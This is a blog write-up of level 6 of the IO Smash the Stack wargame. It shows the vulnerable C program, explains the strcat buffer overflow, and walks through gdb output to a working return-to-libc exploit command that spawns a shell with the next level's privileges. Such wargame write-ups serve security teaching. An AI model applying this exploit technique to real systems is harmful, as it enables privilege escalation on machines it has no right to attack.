---
author: alvaro
comments: true
layout: post
title: Level 06 I/O Smash the Stack
categories:
- Archive
tags:
- security
---

Those days I have been playing a little bit with [IO Smash the Stack](http://io.smashthestack.org/). By now I am in the level 8.

Today I will explain how I resolved the level06 and the process that I followed. In this level we have the code and it is more large than the previous.

```C
//written by bla
//inspired by nnp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

enum{
LANG_ENGLISH,
LANG_FRANCAIS,
LANG_DEUTSCH,
};

int language = LANG_ENGLISH;

struct UserRecord{
	char name[40];
	char password[32];
	int id;
};

void greetuser(struct UserRecord user){
	char greeting[64];
	switch(language){
		case LANG_ENGLISH:
			strcpy(greeting, "Hi "); break;
		case LANG_FRANCAIS:
			strcpy(greeting, "Bienvenue "); break;
		case LANG_DEUTSCH:
			strcpy(greeting, "Willkommen "); break;
	}
	strcat(greeting, user.name);
	printf("%s\n", greeting);
}

int main(int argc, char **argv, char **env){
	if(argc != 3) {
		printf("USAGE: %s [name] [password]\n", argv[0]);
		return 1;
	}

	struct UserRecord user = {0};
	strncpy(user.name, argv[1], sizeof(user.name));
	strncpy(user.password, argv[2], sizeof(user.password));

	char *envlang = getenv("LANG");
	if(envlang)
		if(!memcmp(envlang, "fr", 2))
			language = LANG_FRANCAIS;
		else if(!memcmp(envlang, "de", 2))
			language = LANG_DEUTSCH;

	greetuser(user);
}
```

What this code does is easy to understand and also it is easy to spot where the vulnerability resides. Is in the function `strcat`. If we go to the `man page`.

>The  strcat() function appends the src string to the dest string, overwriting the terminating null byte ('\0') at the end of dest, and then adds a terminating null byte.  The strings may not overlap, and the dest string must have enough space for the result.  If dest is not large enough, program behavior is unpredictable; buffer overruns  are  a  favorite  avenue  for  attacking secure programs.

>The strncat() function is similar, except that

>    *  it will use at most n bytes from src; and
> 	 *  src does not need to be null-terminated if it contains n or more bytes.

Basically strcat will append the src string until we get the `\0`. How we want to overflow the stack of greeting in the function `greetuser` we should look how the stack looks like when this function is called. To find out we will use `gdb`.

```bash
gdb-peda$ disas greetuser
Dump of assembler code for function greetuser:
   0x0804851c <+0>:	push   ebp
   0x0804851d <+1>:	mov    ebp,esp
   0x0804851f <+3>:	sub    esp,0x58
   0x08048522 <+6>:	mov    eax,ds:0x8049964
   0x08048527 <+11>:	cmp    eax,0x1
   0x0804852a <+14>:	je     0x8048540 <greetuser+36>
   0x0804852c <+16>:	cmp    eax,0x2
   0x0804852f <+19>:	je     0x804855c <greetuser+64>
   0x08048531 <+21>:	test   eax,eax
   0x08048533 <+23>:	jne    0x8048574 <greetuser+88>
   0x08048535 <+25>:	lea    eax,[ebp-0x48]
   0x08048538 <+28>:	mov    DWORD PTR [eax],0x206948
   0x0804853e <+34>:	jmp    0x8048574 <greetuser+88>
   0x08048540 <+36>:	lea    eax,[ebp-0x48]
   0x08048543 <+39>:	mov    DWORD PTR [eax],0x6e656942
   0x08048549 <+45>:	mov    DWORD PTR [eax+0x4],0x756e6576
   0x08048550 <+52>:	mov    WORD PTR [eax+0x8],0x2065
   0x08048556 <+58>:	mov    BYTE PTR [eax+0xa],0x0
   0x0804855a <+62>:	jmp    0x8048574 <greetuser+88>
   0x0804855c <+64>:	lea    eax,[ebp-0x48]
   0x0804855f <+67>:	mov    DWORD PTR [eax],0x6c6c6957
   0x08048565 <+73>:	mov    DWORD PTR [eax+0x4],0x6d6d6f6b
   0x0804856c <+80>:	mov    DWORD PTR [eax+0x8],0x206e65
   0x08048573 <+87>:	nop
   0x08048574 <+88>:	lea    eax,[ebp+0x8]
   0x08048577 <+91>:	mov    DWORD PTR [esp+0x4],eax
   0x0804857b <+95>:	lea    eax,[ebp-0x48]
   0x0804857e <+98>:	mov    DWORD PTR [esp],eax
   0x08048581 <+101>:	call   0x80483d0 <strcat@plt>
   0x08048586 <+106>:	lea    eax,[ebp-0x48]
   0x08048589 <+109>:	mov    DWORD PTR [esp],eax
   0x0804858c <+112>:	call   0x80483f0 <puts@plt>
   0x08048591 <+117>:	leave
   0x08048592 <+118>:	ret
End of assembler dump.
gdb-peda$ b * 0x0804857e  ; Breakpoint before to call strcat
gdb-peda$ r AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBB 
gdb-peda$ x/64xw $esp
```

![stackio6](/public/images/stackio6.png)

To exploit this we are going to use the technique [Return Into Lib C](http://insecure.org/sploits/linux.libc.return.lpr.sploit.html). What we have to do is overwrite the return address `0x080486af` with the system address and then build a fake stack such that when we resume the execution at the direction of system it sees a valid stack. It would be as simple as put the direction of exit followed by the direction of the string `/bin/sh`. All these directions can be uncovered with `gdb`.

```bash
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7ea9c30 <system>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xb7e9d270 <exit>
gdb-peda$ searchmem /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7faafb4 ("/bin/sh")
``` 

So the beginning of the `argv[1]` must be the direction of `
exit` and then the direction of the string `/bin/sh` followed by as much data as needed until we reach the return address to overwrite it with the direction of system. To exploit it more easily is better use as language `FRANCAIS` or `DEUTSCH` since that will fill the `greeting` variable with more data. Since with the `english` version the `id` was initialize to `0` making the strcat function stopping when it reaches that value.


```bash
level6@io:/levels$ echo $LANG
en_GB.UTF-8
level6@io:/levels$ LANG=de_GB.UTF-8
level6@io:/levels$ echo $LANG
de_GB.UTF-8
```

And finally we get a fresh shell calling it as follows.

```bash
level6@io:/levels$ ./level06 `python -c 'print "\x70\xd2\xe9\xb7" + "\xb4\xaf\xfa\xb7" + "A"*32'` `python -c 'print "B"*25 + "\x30\x9c\xea\xb7"'`
Willkommen p�鷴��AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB0��
sh-4.2$ id
uid=1006(level6) gid=1006(level6) euid=1007(level7) groups=1007(level7),1006(level6),1029(nosu)
sh-4.2$
```
{% include twitter_plug.html %}